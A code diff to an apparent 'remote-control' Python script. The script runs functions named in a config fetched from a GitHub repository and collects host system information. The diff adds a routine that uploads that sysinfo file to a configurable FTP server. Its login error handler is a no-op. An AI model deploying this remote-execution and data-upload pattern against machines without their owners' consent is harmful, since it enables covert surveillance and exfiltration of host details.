@@ -1,3 +1,4 @@
+from __future__ import print_function
 import base64
 import json
 import requests
@@ -6,9 +7,16 @@ import platform
 import psutil
 import socket
 import uuid
+import ftplib
+from pathlib import Path
+
 
 REPO = 'JelleFirlefyn/remote-control'
 CONFIG_FILE = "config.json"
+FTP_HOST = ""
+FTP_PORT = 21
+FTP_USER = ''
+FTP_PASSWORD = ''
 
 #Test functions:
 class t():
@@ -40,6 +48,21 @@ def run_functions(repo_url: str, config_file: str):
         else:
             globals()[function_name]()
 
+def send_file(ftp_host, ftp_port, ftp_user, ftp_password, src_file):
+    ftp = ftplib.FTP()
+    host = ftp_host
+    port = ftp_port
+    ftp.connect(host, port)
+    print (ftp.getwelcome())
+    try:
+        print ("Logging in...")
+        ftp.login(ftp_user, ftp_password)
+    except:
+        "failed to login"
+
+    file_path = Path(src_file)
+    with open(file_path, 'rb') as file:
+        ftp.storbinary(f'STOR {file_path.name}', file)
 
 class sysinfo():
     def __init__(self):
@@ -89,3 +112,6 @@ class sysinfo():
     def writeFile(self):
         with open("sysinfo.txt", 'w') as f:
             f.write(self.getInfo())
+
+    def sendFile(self):
+        send_file(FTP_HOST, FTP_PORT, FTP_USER, FTP_PASSWORD, 'sysinfo.txt')
